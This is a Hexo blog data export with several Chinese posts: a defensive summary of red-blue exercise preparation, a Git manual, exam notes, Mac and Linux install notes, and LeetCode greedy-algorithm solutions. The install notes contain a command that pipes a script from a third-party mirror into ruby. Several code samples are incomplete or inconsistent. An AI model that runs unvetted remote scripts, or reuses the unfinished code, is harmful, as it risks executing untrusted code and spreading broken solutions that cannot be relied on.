{"meta":{"title":"Murray博客","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[],"posts":[{"title":"hvv蓝方思路总结","slug":"hvv蓝方思路总结","date":"2021-03-30T16:00:00.000Z","updated":"2021-04-02T06:34:25.200Z","comments":true,"path":"2021/03/31/hvv蓝方思路总结/","link":"","permalink":"http://example.com/2021/03/31/hvv%E8%93%9D%E6%96%B9%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/","excerpt":"参加过几次攻防演练，因此笔者对此经历总结一下。","text":"参加过几次攻防演练，因此笔者对此经历总结一下。 一、概述想知道”盾“厚不厚，那么就需要”矛“来戳一戳，因此我们站在黑客的视角，梳理攻击流程，再针对性的进行防守设置。 攻击者主要从外网纵向入侵和内网横向渗透。 外网纵向入侵 内网横向渗透 接下来主要对攻防演练的前期准备、进行中、结束复盘三个阶段进行具体工作方案。 二、攻防演练Pre1.日常运维及资产梳理 梳理软硬件资产。重点查看暴露在公网的端口的资产 清理常见CMS框架的特征。 更新软硬件资产的信息。 保持6个月以上系统日志、应用日志、中间件的访问日志。 针对网络、主机进行安全检查，并针对性的优化加固。 2.新上线业务系统的风险评估 未进行风险评估的业务系统禁止上线。 3.每月对防护机制进行排查 排查公网边界具有监测告警/安全防护机制 排查安全设备应用层防护策略 排查安全设备网络层访问控制 排查操作系统本地访问控制 排查安全软件防护策略 4. 排查软件版本漏洞 根据第三方漏洞平台（阿里应急响应中心等），匹配本地资产（操作系统、中间件、web框架），自动化告警漏洞存在和漏洞修复 5. 排查软件逻辑漏洞 代码审计、渗透测试发现 6. 安全意识培训7. 监测告警机制构建 内外网检测警告 构建威胁情报系统 8. 应急响应机制构建 特定安全事件的应急预案及演练 内网的可攻击面经 9. 容错机制构建 重要数据、入侵痕迹本地/异地备份 周期性测试 10. 蜜罐构建 开源蜜罐容易发生逃逸事件，因此不建议使用 三、攻防演练ing高强度、高重复性且容易发生错漏扫 一次性工作： 情报共享：共享攻击源IP的威胁情报，注意交接班（交班人员直接加到本地的防守策略） 人员保障：协调后台支撑专家远程待命， 现场保护：保留溯源至公网ip及攻击路径待分析 攻击溯源：根据现场残留痕迹进行最大程度的入侵溯源 优化加固：根据应急处置报告中的优化建议进行安全隐患、安全风险优化，协助软件开发商进行漏洞优化，对漏洞修复的有效性进行复测 争议处置：对于一些争议的加固意见，上报上级再分析 宁错杀，不放过：对于可能会影响到该系统业务的ip，上报上级再分析 值守计划： 24小时值守，预备替补人员应对突发情况 编写值守成果（时间、封禁IP、漏洞修复程度等） 尽量减少对接事宜，在值守人员处理完后方可交接下一位 重复性工作： 巡检安全/告警系统： 巡检安全防护硬件 巡检安全防护软件 巡检Windows 巡检Linux","categories":[{"name":"hvv","slug":"hvv","permalink":"http://example.com/categories/hvv/"}],"tags":[]},{"title":"","slug":"baidu_verify_code-gZsZUAHhhy","date":"2021-03-15T09:03:53.348Z","updated":"2021-03-15T09:03:53.349Z","comments":true,"path":"2021/03/15/baidu_verify_code-gZsZUAHhhy/","link":"","permalink":"http://example.com/2021/03/15/baidu_verify_code-gZsZUAHhhy/","excerpt":"","text":"f85c36a24f63d87f279a63b6b11db1bf","categories":[],"tags":[]},{"title":"GKNotes","slug":"GKNotes","date":"2021-02-28T16:00:00.000Z","updated":"2021-03-31T12:45:39.396Z","comments":true,"path":"2021/03/01/GKNotes/","link":"","permalink":"http://example.com/2021/03/01/GKNotes/","excerpt":"GKNotes。","text":"GKNotes。 行测题型 言语 数量关系 判断推理 资料分析 言语35–80%-30min课程安排 题型： 片段阅读 语句表达 逻辑填空 片段阅读重点：转折、因果、主题词、正确及错误选项特征 解题顺序：提问–文段–选项 中心理解题 解题思路： 重点词语：关联词、主题词、程度词 行文脉络：总分、分总、总分总、分总分、分分","categories":[{"name":"GK","slug":"GK","permalink":"http://example.com/categories/GK/"}],"tags":[]},{"title":"Git使用手册","slug":"Git使用手册","date":"2021-02-04T16:00:00.000Z","updated":"2021-02-09T01:41:50.560Z","comments":true,"path":"2021/02/05/Git使用手册/","link":"","permalink":"http://example.com/2021/02/05/Git%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/","excerpt":"Git系统学习，使用手册。","text":"Git系统学习，使用手册。 Git 分布式版本控制系统 注：CVS及SVN集中式版本控制系统 创建版本库repository里面每个文件的修改、删除都可以跟踪，可以还原 利用git init将目录编程Git仓库，.git文件是Git来跟踪管理版本库 添加文件到Git仓库，分两步： 使用命令git add &lt;file&gt;，注意，可反复多次使用，添加多个文件； 使用命令git commit -m &lt;message&gt;，完成。 git status命令可以让我们时刻掌握仓库当前的状态 git diff顾名思义就是查看difference git log命令显示从最近到最远的提交日志 Head表示当前版本 版本号由sha1计算而得（可记住版本号reflog永久回退此版本） git reset --hard XXXX 仓库里把每次修改以版本号记录下来，回退某版本仅为将HEAD指向其。 HEAD指向的版本就是当前版本，因此，Git允许我们在版本的历史之间穿梭，使用命令git reset --hard commit_id。 穿梭前，用git log可以查看提交历史，以便确定要回退到哪个版本。 要重返未来，用git reflog查看命令历史，以便确定要回到未来的哪个版本。 工作区和暂存区工作区Working Directory -&gt; git-learn目录 版本库Repository -&gt; .git .git暂存区stage 分支master，指向master的第一个指针HEAD 第一步是用git add把文件添加进去，实际上就是把文件修改添加到暂存区； 第二步是用git commit提交更改，实际上就是把暂存区的所有内容提交到当前分支。 需要提交的文件修改通通放到暂存区，然后，一次性提交暂存区的所有修改。 Untracked files 未添加至暂存区stage 执行git add readme.txt &amp; LICENSE后 执行git commit 提交至分支master 管理修改Git跟踪并管理的是修改，而非文件。 git commit只负责把暂存区的修改提交了 git diff HEAD -- readme.txt命令可以查看工作区和版本库里面最新版本的区别 撤销修改git checkout -- file可以丢弃工作区的修改 场景1：当你改乱了工作区某个文件的内容，想直接丢弃工作区的修改时，用命令git checkout -- file。 场景2：当你不但改乱了工作区某个文件的内容，还添加到了暂存区时，想丢弃修改，分两步，第一步用命令git reset HEAD &lt;file&gt;，就回到了场景1，第二步按场景1操作。 场景3：已经提交了不合适的修改到版本库时，想要撤销本次提交，参考版本回退一节，不过前提是没有推送到远程库。 删除文件一是确实要从版本库中删除该文件，那就用命令git rm删掉，并且git commit： 删错了，因为版本库里还有呢，所以可以很轻松地把误删的文件恢复到最新版本： git checkout -- test.txt 远程仓库git push -u origin master 把本地库的所有内容推送到远程库上 由于远程库是空的，我们第一次推送master分支时，加上了-u参数，Git不但会把本地的master分支内容推送的远程新的master分支，还会把本地的master分支和远程的master分支关联起来，在以后的推送或者拉取时就可以简化命令。 git push origin master 把本地库的所有内容推送到远程库上 要关联一个远程库，使用命令git remote add origin git@server-name:path/repo-name.git； 关联后，使用命令git push -u origin master第一次推送master分支的所有内容； 此后，每次本地提交后，只要有必要，就可以使用命令git push origin master推送最新修改； 从远程库克隆1git clone git@github.com:murraynizeyu&#x2F;git-learn.git 分支管理主分支：master与develop master：分支代表项目处于可发布的状态 develop：需要开发新功能时从develop分支拉出fb-function分支 Feature branches：这种分支和我们程序员日常开发最为密切，称作功能分支。 必须从develop分支创建，完成后合并回develop分支。 Release branches：这个分支用来分布新版本。从develop分支创建，完成后合并回develop与master分支。 Hotfix branches：这个分支主要为修复线上特别紧急的bug准备的。必须从master分支创建，完成后合并回develop与master分支。 总结一下 我们创建dev分支，然后切换到dev分支：git switch -c dev 通过git branch查看当前分支 HEAD指向当前commit版本上传的位置 我们把dev分支的工作成果合并到master分支上：git merge dev git merge命令用于合并指定分支到当前分支。合并后，再查看readme.txt的内容，就可以看到，和dev分支的最新提交是完全一样的。 合并完成后，就可以放心地删除dev分支了：git branch -d dev 直接切换到已有的master分支 git switch master 功能 命令 查看分支 git branch 创建分支 git branch &lt;name&gt; 切换分支 git switch &lt;name&gt; 创建+切换分支 git switch -c &lt;name&gt; 合并某分支到当前分支 git merge &lt;name&gt; 删除分支 git branch -d &lt;name&gt; 解决冲突准备新的feature1分支，继续我们的新分支开发 Git还会自动提示我们当前master分支比远程的master分支要超前1个提交 回到master分支修改readme.txt再次提交 注意产生冲突 通过对readme.txt文件进行修改解决冲突后再上传 1git log --graph --pretty&#x3D;oneline --abbrev-commit 查看分支合并情况 分支管理策略Bug分支 修复bug时，我们会通过创建新的bug分支进行修复，然后合并，最后删除； 当手头工作没有完成时，先把工作现场git stash一下，然后去修复bug，修复后，再git stash pop，回到工作现场； 在master分支上修复的bug，想要合并到当前dev分支，可以用git cherry-pick &lt;commit&gt;命令，把bug提交的修改“复制”到当前分支，避免重复劳动。 Feature分支 添加一个新功能时，你肯定不希望因为一些实验性质的代码，把主分支搞乱了，所以，每添加一个新功能，最好新建一个feature分支，在上面开发，完成后，合并，最后，删除该feature分支。 一切顺利的话，feature分支和bug分支是类似的，合并，然后删除。 就地销毁git branch -D feature-v 多人协作推送分支显示抓取和推送的origin地址 git remote -v 推送本地到远程库 git push origin main master分支是主分支，因此要时刻与远程同步； dev分支是开发分支，团队所有成员都需要在上面工作，所以也需要与远程同步； bug分支只用于在本地修复bug，就没必要推到远程了，除非老板要看看你每周到底修复了几个bug； feature分支是否推到远程，取决于你是否和你的小伙伴合作在上面开发。 抓取分支 从本地推送分支，使用git push origin branch-name，如果推送失败，先用git pull抓取远程的新提交； 在本地创建和远程分支对应的分支，使用git checkout -b branch-name origin/branch-name，本地和远程分支的名称最好一致； 建立本地分支和远程分支的关联，使用git branch --set-upstream branch-name origin/branch-name； 从远程抓取分支，使用git pull，如果有冲突，要先处理冲突。 Rebase","categories":[{"name":"工具书","slug":"工具书","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7%E4%B9%A6/"}],"tags":[]},{"title":"Hello World","slug":"hello-world","date":"2021-01-27T16:03:02.785Z","updated":"2021-01-27T16:03:02.786Z","comments":true,"path":"2021/01/28/hello-world/","link":"","permalink":"http://example.com/2021/01/28/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]},{"title":"部分软件安装记录","slug":"部分软件安装记录","date":"2021-01-04T16:00:00.000Z","updated":"2021-01-30T12:07:00.687Z","comments":true,"path":"2021/01/05/部分软件安装记录/","link":"","permalink":"http://example.com/2021/01/05/%E9%83%A8%E5%88%86%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/","excerpt":"一些记不住的Linux和Docker命令。","text":"一些记不住的Linux和Docker命令。 Jupyter Notebook1. 安装升级pip3 pip3 install --upgrade pip&amp;pip3 install jupyter 2.运行查看帮助jupyter notebook -h 运行jupyter notebook 默认888端口 指定端口 jupyter notebook --port &lt;XXX&gt; 后台运行 jupyter notebook --no-browser 3.主题设置安装pip3 install jupyterthemes 列出可用的主题jt -l 选择主题jt -t XXX 4.扩展设置安装 123pip install jupyter_contrib_nbextensionsjupyter contrib nbextension install --userpip install jupyter_nbextensions_configurator Homebrew安装 /usr/bin/ruby -e &quot;$(curl -fsSL https://cdn.jsdelivr.net/gh/ineo6/homebrew-install/install)&quot; 换源 12git -C &quot;$(brew --repo)&quot; remote set-url origin https://mirrors.ustc.edu.cn/brew.gitgit -C &quot;$(brew --repo)&quot; remote set-url origin https:*//mirrors.ustc.edu.cn/brew.git* 使用 1234567891011121314// 查询：brew search 软件名// 安装：brew install 软件名// 卸载：brew uninstall 软件名// 更新 Homebrew：brew update // 查看 Homebrew 配置信息：brew config iTerm2 + Oh My Zsh参考地址 被墙了需要手动下载并运行 https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh 设置主题 找到文件 open ~/.zshrc 找到ZSH_THEME=&quot;robbyrussell&quot; 主题网站https://github.com/ohmyzsh/ohmyzsh/wiki/Themes alias1.进入~/.bashrc 输入alias jn=&quot;jupyter notebook&quot;2.生效source ~/.bashrc3. 应用程序别名alias subl=&quot;/Applications/Sublime\\ Text.app/Contents/SharedSupport/bin/subl&quot; Command Line Tools Apple 家官网：https://developer.apple.com/download/more/ 以 Apple ID 登录 在搜索框搜索 Command Line Tools 打开你 macOS 上的 XCode，检查其版本号 下载对应版本的 Command Line Tools 镜像（*.dmg） 从镜像里手工安装 Ubuntu 缺少依赖问题Linux常用命令 用途 命令 关机 shut down -h now 新建root用户 sudo passwd root 换源 1234567891011121314sudo cp /etc/apt/sources.list /etc/apt/sources_init.listsudo gedit /etc/apt/sources.listdeb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse Hexo个人博客安装Gitbrew install git安装nodejs1234567brew install nodejsbrew install npm# 测试node -vnpm -v 安装hexo1234567891011npm install -g hexo-cli# 测试hexo -vhexo init myblogcd myblog //进入这个myblog文件夹npm installhexo ghexo server 生成SSH添加到GitHub123456789git config --global user.name &quot;yourname&quot; git config --global user.email &quot;youremail&quot;ssh-keygen -t rsa -C &quot;youremail&quot;Github-&gt;Setting-&gt;deploy keys id_rsa.pub# 测试ssh -T git@github.com 部署Hexo到Github12345678910111213open _config.ymldeploy: type: git repo: https://github.com/YourgithubName/YourgithubName.github.io.git branch: master npm install hexo-deployer-git --save hexo cleanhexo generatehexo deploy GitBook安装 1npm install gitbook-cli -g","categories":[{"name":"杂","slug":"杂","permalink":"http://example.com/categories/%E6%9D%82/"}],"tags":[]},{"title":"【LeetCode】【最易懂的贪心算法】","slug":"【LeetCode】【最易懂的贪心算法】","date":"2021-01-04T16:00:00.000Z","updated":"2021-02-02T15:27:05.709Z","comments":true,"path":"2021/01/05/【LeetCode】【最易懂的贪心算法】/","link":"","permalink":"http://example.com/2021/01/05/%E3%80%90LeetCode%E3%80%91%E3%80%90%E6%9C%80%E6%98%93%E6%87%82%E7%9A%84%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95%E3%80%91/","excerpt":"贪心算法","text":"贪心算法 贪心算法顾名思义，贪心算法或贪心思想采用贪心的策略，保证每次操作都是局部最优的，从而使最 后得到的结果是全局最优的。 举一个最简单的例子 小明和小王喜欢吃苹果，小明可以吃五个，小王可以吃三个。已知苹 果园里有吃不完的苹果，求小明和小王一共最多吃多少个苹果。在这个例子中，我们可以选用的 贪心策略为，每个人吃自己能吃的最多数量的苹果，这在每个人身上都是局部最优的。又因为全 局结果是局部结果的简单求和，且局部结果互不相干，因此局部最优的策略也同样是全局最优的 策略。 分配问题455. 分发饼干（简单）题目描述： 假设你是一位很棒的家长，想要给你的孩子们一些小饼干。但是，每个孩子最多只能给一块饼干。 对每个孩子$i$，都有一个胃口值$g[i]$，这是能让孩子们满足胃口的饼干的最小尺寸；并且每块饼干$j$，都有一个尺寸$s[j]$。如果 $s[j] &gt;= g[i]$，我们可以将这个饼干$j$分配给孩子$i$，这个孩子会得到满足。你的目标是尽可能满足越多数量的孩子，并输出这个最大数值。 示例 1: 输入: $g = [1,2,3], s = [1,1]$ 输出: 1 解释: 你有三个孩子和两块小饼干，3个孩子的胃口值分别是：1,2,3。 虽然你有两块小饼干，由于他们的尺寸都是1，你只能让胃口值是1的孩子满足。 所以你应该输出1。 示例 2: 输入: $g = [1,2], s = [1,2,3]$ 输出: 2 解释: 你有两个孩子和三块小饼干，2个孩子的胃口值分别是1,2。你拥有的饼干数量和尺寸都足以让所有孩子满足。所以你应该输出2。 LeetCode 101 解法思路 先将孩子和饼干都排序，每次让胃口值吃能满足其胃口值最小的饼干即可。 12345g = [1,2,3] s = [1,1] g1 = [1,2] s1 = [1,2,3] 12345678910111213141516171819202122232425def findContentChildren(g,s) -&gt; int: g = sorted(g) s = sorted(s) i = j = 0 count = 0 while((i &lt; len(g)) &amp; (j &lt; len(s))): if g[i] &lt;= s[j]: count += 1 i += 1 j += 1 else: j += 1 return count# 并不需要设置计数器，只需计算孩子吃饼干的个数def findContentChildren2(g,s) -&gt; int: g = sorted(g) s = sorted(s) i,j = 0,0 while((i &lt; len(g)) &amp; (j &lt; len(s))): if g[i] &lt;= s[j]: i += 1 j += 1 return ifindContentChildren2(g1,s1) 2 135. 分发糖果（困难）题目描述： 老师想给孩子们分发糖果，有 N 个孩子站成了一条直线，老师会根据每个孩子的表现，预先给他们评分。 你需要按照以下要求，帮助老师给这些孩子分发糖果： 每个孩子至少分配到 1 个糖果。 相邻的孩子中，评分高的孩子必须获得更多的糖果。 那么这样下来，老师至少需要准备多少颗糖果呢？ 示例 1: 输入: [1,0,2] 输出: 5 解释: 你可以分别给这三个孩子分发 2、1、2 颗糖果。 示例 2: 输入: [1,2,2] 输出: 4 解释: 你可以分别给这三个孩子分发 1、2、1 颗糖果。 第三个孩子只得到 1 颗糖果，这已满足上述两个条件。 LeetCode 101 解法 从左到右循环一次，若右比左高（ratings），则candy+1 再从右到左循环一次，若左比右高（ratings）,则candy+1 1ratings = [1,0,2] 1234567891011121314151617181920212223242526def candy(ratings): #初始化每个孩子糖果数 candies = [] for r in ratings: candies.append(1) i = 1 while i &lt;= len(ratings) - 1: if ratings[i - 1] &lt; ratings[i]: candies[i] = candies[i - 1] + 1 i += 1 i -= 1 while i &gt;= 1: print(i) if ratings[i - 1] &gt; ratings[i] and candies[i - 1] &lt;= candies[i]: candies[i - 1] = candies[i] + 1 i -= 1 sum = 0 for i in candies: sum += i return sumcandy(ratings) 2 1 5 方法1：暴力法思路 从左到右扫描 若i比i-1评分高，就给i糖更新至[i-1]糖+1 若i比i+1评分高，就给i糖更新至[i+1]糖+1 一直重复，设置变动flag，直至不再candies不再出现变换 复杂度分析 时间复杂度：O(n^2)。对于每个元素，我们最多要遍历 n 次。 空间复杂度： O(n)。需要一个长度为 n 的 candies数组。 1ratings = [1,0,2] 123456789101112131415161718192021222324def candy1(ratings): candies = [] for r in ratings: candies.append(1) flag = True while flag: flag = False i = 0 while i &lt;= len(ratings) - 1: if i &gt; 0 and ratings[i - 1] &lt; ratings[i] and candies[i - 1] &gt;= candies[i] : candies[i] = candies[i - 1] + 1 flag = True if i &lt; len(ratings) - 1 and ratings[i + 1] &lt; ratings[i] and candies[i + 1] &gt;= candies[i] : candies[i] = candies[i + 1] + 1 flag = True i += 1 sum = 0 for i in candies: sum += i return sumcandy1(ratings) 5 方法 2：用两个数组思路 l2r数组：从左向右扫描 r2l数组：从右向左扫描 取 max(l2r[i],r2l[i) 1ratings = [1,0,2] 12345678910111213141516171819202122232425262728293031323334def candy2(ratings): l2r = [] r2l = [] for r in ratings: l2r.append(1) r2l.append(1) i = 1 while i &lt; len(ratings): if ratings[i - 1] &lt; ratings[i]: l2r[i] = l2r[i - 1] + 1 i += 1 j = len(ratings) - 2 while j &gt;= 0: if ratings[j + 1] &lt; ratings[j]: r2l[j] = r2l[j + 1] + 1 j -= 1 #print(l2r) #print(r2l) candies = [] i = 0 while i &lt; len(l2r): candies.append(max(l2r[i],r2l[i])) i += 1 sum = 0 for c in candies: sum += c return sumcandy2(ratings) 5 方法 3：使用一个数组(同LeetCode101解法 略) 方法 4：常数空间一次遍历直接看不懂 下次再说吧 区间问题-435. 无重叠区间（中等）给定一个区间的集合，找到需要移除区间的最小数量，使剩余区间互不重叠。 注意: 可以认为区间的终点总是大于它的起点。 区间 [1,2] 和 [2,3] 的边界相互“接触”，但没有相互重叠。 示例 1: 输入: [ [1,2], [2,3], [3,4], [1,3] ] 输出: 1 解释: 移除 [1,3] 后，剩下的区间没有重叠。 示例 2: 输入: [ [1,2], [1,2], [1,2] ] 输出: 2 解释: 你需要移除两个 [1,2] 来使剩下的区间没有重叠。 示例 3: 输入: [ [1,2], [2,3] ] 输出: 0 解释: 你不需要移除任何区间，因为它们已经是无重叠的了。 Leetcode 101 解法贪心策略： 优先保留结尾小且不相交的区间。 12345intervals = [[1,100],[11,22],[1,11],[2,12]]# 自定义关键字进行排序 对end进行排序 intervals.sort(key = lambda obj:obj[1], reverse=False)intervals [[1, 11], [2, 12], [11, 22], [1, 100]] 12345678910111213141516def eraseOverlapIntervals(intervals): if len(intervals) == 0: return 0 intervals.sort(key = lambda obj:obj[1], reverse=False) total = 1 x_end = intervals[0][1] print(x_end) for interval in intervals: print(interval) if interval[1] &gt; x_end: total += 1 x_end = interval[1] return len(intervals)-totaleraseOverlapIntervals(intervals) 11 [1, 11] [2, 12] [11, 22] [1, 100] 0 背包问题 思路： 计算每种物品的单位重量的价值$\\frac{v_i}{w_i}$ 根据贪心选择策略，将尽可能多的单位重量价值高的物品装入背包 接着选择单位价值次高的物品并尽可能多地装入背包 依次类推，直到背包装满为止 C++示例代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include &lt;iostream&gt; using namespace std;void knapsack(int n, double M, double v[], double w[], double x[]); // 背包算法int main()&#123; cout &lt;&lt; &quot;背包问题的贪心算法\\n\\n&quot;; const int n = 4; // 物品个数 double C = 50; // 背包所能容纳的重量 double x[n + 1]; // 物品选择向量 double w[] = &#123; 0,10,20,30,40 &#125;; // 下标从1开始，物品i的重量（已按单位价值减序排序） double v[] = &#123; 0,60,100,120,120 &#125;; // 下标从1开始，物品i的价值（已按单位价值减序排序） cout &lt;&lt; &quot;背包所能容纳的重量为：&quot; &lt;&lt; C &lt;&lt; endl; cout &lt;&lt; &quot;物品的重量和价值分别为：&quot; &lt;&lt; endl; for (int i = 1; i &lt;= n; i++) cout &lt;&lt; &quot;[&quot; &lt;&lt; i &lt;&lt; &quot;]:(&quot; &lt;&lt; w[i] &lt;&lt; &quot;,&quot; &lt;&lt; v[i] &lt;&lt; &quot;)&quot; &lt;&lt; endl; knapsack(n, C, w, v, x); cout &lt;&lt; &quot;\\n物品选择向量为：(&quot;; for (int i = 1; i &lt;= n; i++) &#123; cout &lt;&lt; x[i]; if (i + 1 &lt;= n) cout &lt;&lt; &quot;,&quot;; else cout &lt;&lt; &quot;)\\n&quot;; &#125; return 0;&#125;void knapsack(int n, double C, double w[], double v[], double x[])&#123; // 对物品按单位价值排序 sort(n, w, v); // 所有元素设为0，背包初始状态（没有装入任何物品） memset(x, 0, sizeof(double) * (n + 1)); int i; // 第 i 个物品 double c = C; // 背包剩余容量 // 物品i整件被装下，x[i]=1 for (i = 1;i &lt;= n;i++) &#123; if (w[i] &gt; c) break; x[i] = 1; c -= w[i]; &#125; // 物品i只有部分被装下，x[i] = c / w[i]; if (i &lt;= n) x[i] = c / w[i];&#125; 1234567891011# 背包容量c = 25# 物品种类n = 3# 物品重量数组weights = [5, 10, 15]# 物品价值数组values = [50, 80, 45] 1234567891011def knapsack(weights, values, n ,c): v = [] for i in range(n): v.append(values[i] / weights[i]) sorted(v) if c &gt; knapsack(weights, values, n, c) [10.0, 8.0, 3.0] 练习巩固605. 种花问题（简单）题目描述：假设你有一个很长的花坛，一部分地块种植了花，另一部分却没有。可是，花卉不能种植在相邻的地块上，它们会争夺水源，两者都会死去。 给定一个花坛（表示为一个数组包含0和1，其中0表示没种植花，1表示种植了花），和一个数 n 。能否在不打破种植规则的情况下种入 n 朵花？能则返回True，不能则返回False。 示例 1: 输入: flowerbed = [1,0,0,0,1], n = 1输出: True 示例 2: 输入: flowerbed = [1,0,0,0,1], n = 2输出: False注意: 数组内已种好的花不会违反种植规则。输入的数组长度范围为 [1, 20000]。n 是非负整数，且不会超过输入数组的大小。 方法: 给flowerbed左右均添加上[0] 依次遍历i-1、i、i+1位置时候都为0的时候计数器+1. 123456789101112131415f = [0,0,0,0,0,1,0,0]def canPlaceFlowers(flowerbed,n): flowerbed = [0] + flowerbed flowerbed = flowerbed + [0] for i in range(1, len(flowerbed) - 1): if flowerbed[i - 1] == 0 and flowerbed[i] == 0 and flowerbed[i + 1] == 0: n -= 1 flowerbed[i] = 1 print(i) if n &lt;= 0:return True return FalsecountFlower(f,0) 1 True -452. 用最少数量的箭引爆气球（中等）在二维空间中有许多球形的气球。对于每个气球，提供的输入是水平方向上，气球直径的开始和结束坐标。由于它是水平的，所以纵坐标并不重要，因此只要知道开始和结束的横坐标就足够了。开始坐标总是小于结束坐标。 一支弓箭可以沿着 $x$ 轴从不同点完全垂直地射出。在坐标 x 处射出一支箭，若有一个气球的直径的开始和结束坐标为 $xstart$，$xend$， 且满足$xstart ≤ x ≤ xend$，则该气球会被引爆。可以射出的弓箭的数量没有限制。 弓箭一旦被射出之后，可以无限地前进。我们想找到使得所有气球全部被引爆，所需的弓箭的最小数量。 给你一个数组$points$，其中 $points [i] = [xstart,xend]$，返回引爆所有气球所必须射出的最小弓箭数。 示例 1： 输入：$points = [[10,16],[2,8],[1,6],[7,12]]$ 输出：2 解释：对于该样例，$x = 6$ 可以射爆 $[2,8],[1,6]$ 两个气球，以及$x = 11$射爆另外两个气球 示例 2： 输入：$points = [[1,2],[3,4],[5,6],[7,8]]$ 输出：4 示例 3： 输入：$points = [[1,2],[2,3],[3,4],[4,5]] $输出：2 示例 4： 输入：$points = [[1,2]]$ 输出：1 示例 5： 输入：$points = [[2,3],[2,3]]$输出：1 提示：$$0 &lt;= points.length &lt;= 104 $$$$points[i].length == 2 $$$$-231 &lt;= xstart &lt; xend &lt;= 231 - 1$$ -763. 划分字母区间（中等）字符串 S 由小写字母组成。我们要把这个字符串划分为尽可能多的片段，同一字母最多出现在一个片段中。返回一个表示每个字符串片段的长度的列表。 示例： 输入：S = “ababcbacadefegdehijhklij”输出：[9,7,8]解释：划分结果为 “ababcbaca”, “defegde”, “hijhklij”。每个字母最多出现在一个片段中。像 “ababcbacadefegde”, “hijhklij” 的划分是错误的，因为划分的片段数较少。 提示： S的长度在[1, 500]之间。S只包含小写字母 ‘a’ 到 ‘z’ 。 -122. 买卖股票的最佳时机 II（简单）给定一个数组，它的第 i 个元素是一支给定股票第 i 天的价格。 设计一个算法来计算你所能获取的最大利润。你可以尽可能地完成更多的交易（多次买卖一支股票）。 注意：你不能同时参与多笔交易（你必须在再次购买前出售掉之前的股票）。 示例 1: 输入: [7,1,5,3,6,4]输出: 7解释: 在第 2 天（股票价格 = 1）的时候买入，在第 3 天（股票价格 = 5）的时候卖出, 这笔交易所能获得利润 = 5-1 = 4 。 随后，在第 4 天（股票价格 = 3）的时候买入，在第 5 天（股票价格 = 6）的时候卖出, 这笔交易所能获得利润 = 6-3 = 3 。示例 2: 输入: [1,2,3,4,5]输出: 4解释: 在第 1 天（股票价格 = 1）的时候买入，在第 5 天 （股票价格 = 5）的时候卖出, 这笔交易所能获得利润 = 5-1 = 4 。 注意你不能在第 1 天和第 2 天接连购买股票，之后再将它们卖出。 因为这样属于同时参与了多笔交易，你必须在再次购买前出售掉之前的股票。示例 3: 输入: [7,6,4,3,1]输出: 0解释: 在这种情况下, 没有交易完成, 所以最大利润为 0。 提示： 1 &lt;= prices.length &lt;= 3 * 10 ^ 40 &lt;= prices[i] &lt;= 10 ^ 4 -406. 根据身高重建队列（中等）假设有打乱顺序的一群人站成一个队列，数组 people 表示队列中一些人的属性（不一定按顺序）。每个 people[i] = [hi, ki] 表示第 i 个人的身高为 hi ，前面 正好 有 ki 个身高大于或等于 hi 的人。 请你重新构造并返回输入数组 people 所表示的队列。返回的队列应该格式化为数组 queue ，其中 queue[j] = [hj, kj] 是队列中第 j 个人的属性（queue[0] 是排在队列前面的人）。 示例 1： 输入：people = [[7,0],[4,4],[7,1],[5,0],[6,1],[5,2]]输出：[[5,0],[7,0],[5,2],[6,1],[4,4],[7,1]]解释：编号为 0 的人身高为 5 ，没有身高更高或者相同的人排在他前面。编号为 1 的人身高为 7 ，没有身高更高或者相同的人排在他前面。编号为 2 的人身高为 5 ，有 2 个身高更高或者相同的人排在他前面，即编号为 0 和 1 的人。编号为 3 的人身高为 6 ，有 1 个身高更高或者相同的人排在他前面，即编号为 1 的人。编号为 4 的人身高为 4 ，有 4 个身高更高或者相同的人排在他前面，即编号为 0、1、2、3 的人。编号为 5 的人身高为 7 ，有 1 个身高更高或者相同的人排在他前面，即编号为 1 的人。因此 [[5,0],[7,0],[5,2],[6,1],[4,4],[7,1]] 是重新构造后的队列。示例 2： 输入：people = [[6,0],[5,0],[4,0],[3,2],[2,2],[1,4]]输出：[[4,0],[5,0],[2,2],[3,2],[1,4],[6,0]] 提示： 1 &lt;= people.length &lt;= 20000 &lt;= hi &lt;= 1060 &lt;= ki &lt; people.length题目数据确保队列可以被重建 665. 非递减数列（简单）给你一个长度为 n 的整数数组，请你判断在 最多 改变 1 个元素的情况下，该数组能否变成一个非递减数列。 我们是这样定义一个非递减数列的： 对于数组中所有的 i (0 &lt;= i &lt;= n-2)，总满足 nums[i] &lt;= nums[i + 1]。 示例 1: 输入: nums = [4,2,3]输出: true解释: 你可以通过把第一个4变成1来使得它成为一个非递减数列。示例 2: 输入: nums = [4,2,1]输出: false解释: 你不能在只改变一个元素的情况下将其变为非递减数列。 说明： 1 &lt;= n &lt;= 10 ^ 4 -10 ^ 5 &lt;= nums[i] &lt;= 10 ^ 5 12nums = [4,2,1] 12345678910111213141516def checkPossibility(nums) -&gt; bool: count = 0 for i in range(1, len(nums) - 1): if nums[i] &gt; nums[i + 1]: count 